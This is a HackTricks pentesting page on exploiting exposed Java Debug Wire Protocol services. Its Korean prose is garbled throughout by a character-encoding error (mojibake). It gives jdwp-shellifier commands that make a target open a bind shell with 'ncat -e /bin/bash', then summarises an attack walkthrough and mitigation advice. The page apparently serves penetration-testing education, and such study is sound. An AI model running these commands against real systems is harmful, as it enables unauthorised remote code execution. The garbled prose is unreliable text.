# JDWP - ìë°” ë””ë²„ê·¸ ì™€ì´ì–´ í”„ë¡œí† ì½œì˜ Pentesting

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

## Exploiting

JDWPì˜ ì·¨ì•½ì ì€ **ì¸ì¦ ë° ì•”í˜¸í™”ì˜ ë¶€ì¬**ì— ê¸°ì¸í•©ë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ **í¬íŠ¸ 8000**ì—ì„œ ì°¾ì„ ìˆ˜ ìˆì§€ë§Œ ë‹¤ë¥¸ í¬íŠ¸ë„ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì´ˆê¸° ì—°ê²°ì€ ëŒ€ìƒ í¬íŠ¸ë¡œ "JDWP-Handshake"ë¥¼ ë³´ë‚´ì–´ ìˆ˜í–‰ë©ë‹ˆë‹¤. JDWP ì„œë¹„ìŠ¤ê°€ í™œì„±í™”ë˜ì–´ ìˆë‹¤ë©´, ë™ì¼í•œ ë¬¸ìì—´ë¡œ ì‘ë‹µí•˜ì—¬ ì¡´ì¬ë¥¼ í™•ì¸í•©ë‹ˆë‹¤. ì´ í•¸ë“œì…°ì´í¬ëŠ” ë„¤íŠ¸ì›Œí¬ ìƒì˜ JDWP ì„œë¹„ìŠ¤ë¥¼ ì‹ë³„í•˜ê¸° ìœ„í•œ ì§€ë¬¸ ì¸ì‹ ë°©ë²•ìœ¼ë¡œ ì‘ë™í•©ë‹ˆë‹¤.

í”„ë¡œì„¸ìŠ¤ ì‹ë³„ ì¸¡ë©´ì—ì„œ, Java í”„ë¡œì„¸ìŠ¤ì—ì„œ "jdwk" ë¬¸ìì—´ì„ ê²€ìƒ‰í•˜ë©´ í™œì„± JDWP ì„¸ì…˜ì„ ë‚˜íƒ€ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê¸°ë³¸ ë„êµ¬ëŠ” [jdwp-shellifier](https://github.com/hugsy/jdwp-shellifier)ì…ë‹ˆë‹¤. ë‹¤ì–‘í•œ ë§¤ê°œë³€ìˆ˜ì™€ í•¨ê»˜ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 #Obtain internal data
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --cmd 'ncat -l -p 1337 -e /bin/bash' #Exec something
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'ncat -l -p 1337 -e /bin/bash' #Uses java.lang.String.indexOf as breakpoint instead of java.net.ServerSocket.accept
```
`--break-on 'java.lang.String.indexOf'`ë¥¼ ì‚¬ìš©í•˜ë©´ ê³µê²©ì´ ë” **ì•ˆì •ì **ì´ë¼ëŠ” ê²ƒì„ ë°œê²¬í–ˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  í˜¸ìŠ¤íŠ¸ì— ë°±ë„ì–´ë¥¼ ì—…ë¡œë“œí•˜ê³  ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ” ëŒ€ì‹ ì— ë°±ë„ì–´ë¥¼ ì‹¤í–‰í•œë‹¤ë©´ ê³µê²©ì€ ë”ìš± ì•ˆì •ì ì¼ ê²ƒì…ë‹ˆë‹¤.

## ìì„¸í•œ ë‚´ìš©

**ì´ê²ƒì€ [https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)ì˜ ìš”ì•½ì…ë‹ˆë‹¤.** ìì„¸í•œ ë‚´ìš©ì€ í•´ë‹¹ ë§í¬ë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤.


1. **JDWP ê°œìš”**:
- ì£¼ë¡œ ë™ê¸°ì‹ì¸ íŒ¨í‚· ê¸°ë°˜ ë„¤íŠ¸ì›Œí¬ ì´ì§„ í”„ë¡œí† ì½œì…ë‹ˆë‹¤.
- ì¸ì¦ ë° ì•”í˜¸í™” ê¸°ëŠ¥ì´ ì—†ì–´ ì ëŒ€ì ì¸ ë„¤íŠ¸ì›Œí¬ì— ë…¸ì¶œë  ê²½ìš° ì·¨ì•½í•©ë‹ˆë‹¤.

2. **JDWP í•¸ë“œì…°ì´í¬**:
- ê°„ë‹¨í•œ í•¸ë“œì…°ì´í¬ í”„ë¡œì„¸ìŠ¤ë¥¼ ì‚¬ìš©í•˜ì—¬ í†µì‹ ì„ ì´ˆê¸°í™”í•©ë‹ˆë‹¤. ë””ë²„ê±°(í´ë¼ì´ì–¸íŠ¸)ì™€ ë””ë²„ê¸°(ì„œë²„) ê°„ì— 14ìë¦¬ ASCII ë¬¸ìì—´ "JDWP-Handshake"ê°€ êµí™˜ë©ë‹ˆë‹¤.

3. **JDWP í†µì‹ **:
- ë©”ì‹œì§€ëŠ” ê¸¸ì´, ID, í”Œë˜ê·¸ ë° ëª…ë ¹ ì§‘í•©ê³¼ ê°™ì€ í•„ë“œë¥¼ í¬í•¨í•œ ê°„ë‹¨í•œ êµ¬ì¡°ë¥¼ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤.
- ëª…ë ¹ ì§‘í•© ê°’ì€ 0x40ì—ì„œ 0x80ê¹Œì§€ì´ë©° ë‹¤ì–‘í•œ ì‘ì—… ë° ì´ë²¤íŠ¸ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

4. **Exploitation**:
- JDWPëŠ” ì„ì˜ì˜ í´ë˜ìŠ¤ì™€ ë°”ì´íŠ¸ì½”ë“œë¥¼ ë¡œë“œí•˜ê³  í˜¸ì¶œí•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ë³´ì•ˆ ìœ„í—˜ì´ ìˆìŠµë‹ˆë‹¤.
- ì´ ë¬¸ì„œì—ì„œëŠ” Java Runtime ì°¸ì¡°ë¥¼ ê°€ì ¸ì˜¤ê³  ì¤‘ë‹¨ì ì„ ì„¤ì •í•˜ê³  ë©”ì„œë“œë¥¼ í˜¸ì¶œí•˜ëŠ” 5ë‹¨ê³„ì˜ ê³µê²© ê³¼ì •ì„ ì„¤ëª…í•©ë‹ˆë‹¤.

5. **ì‹¤ì œ ê³µê²© ì‚¬ë¡€**:
- ì ì¬ì ì¸ ë°©í™”ë²½ ë³´í˜¸ì—ë„ ë¶ˆêµ¬í•˜ê³ , ShodanHQ ë° GitHubê³¼ ê°™ì€ í”Œë«í¼ì—ì„œ ê²€ìƒ‰ ê²°ê³¼ë¥¼ í†µí•´ ì‹¤ì œ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ JDWP ì„œë¹„ìŠ¤ë¥¼ ë°œê²¬í•˜ê³  ê³µê²©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- ì´ ê³µê²© ìŠ¤í¬ë¦½íŠ¸ëŠ” ë‹¤ì–‘í•œ JDK ë²„ì „ì—ì„œ í…ŒìŠ¤íŠ¸ë˜ì—ˆìœ¼ë©° í”Œë«í¼ì— ë…ë¦½ì ì´ë©° ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ì›ê²© ì½”ë“œ ì‹¤í–‰(RCE)ì„ ì œê³µí•©ë‹ˆë‹¤.

6. **ë³´ì•ˆ ì˜í–¥**:
- ì¸í„°ë„·ì—ì„œ ì—´ë¦° JDWP ì„œë¹„ìŠ¤ì˜ ì¡´ì¬ëŠ” ì •ê¸°ì ì¸ ë³´ì•ˆ ê²€í† , ìš´ì˜ í™˜ê²½ì—ì„œ ë””ë²„ê·¸ ê¸°ëŠ¥ ë¹„í™œì„±í™” ë° ì ì ˆí•œ ë°©í™”ë²½ êµ¬ì„±ì˜ í•„ìš”ì„±ì„ ê°•ì¡°í•©ë‹ˆë‹¤.


### **ì°¸ê³  ìë£Œ:**

* [[https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)]
* [https://github.com/IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
* [http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html](http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html)
* http://www.secdev.org/projects/scapy(no longer active)
* [http://www.shodanhq.com/search?q=JDWP-HANDSHAKE](http://www.shodanhq.com/search?q=JDWP-HANDSHAKE)
* http://www.hsc-news.com/archives/2013/000109.html (no longer active)
* [http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt](http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt)
* https://github.com/search?q=-Xdebug+-Xrunjdwp\&type=Code\&ref=searchresults
* [http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html](http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html](http://docs.oracle.com)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html](http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html)
* [http://nmap.org/nsedoc/scripts/jdwp-exec.html](http://nmap.org/nsedoc/scripts/jdwp-exec.html)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family)ì¸ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **ìì‹ ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
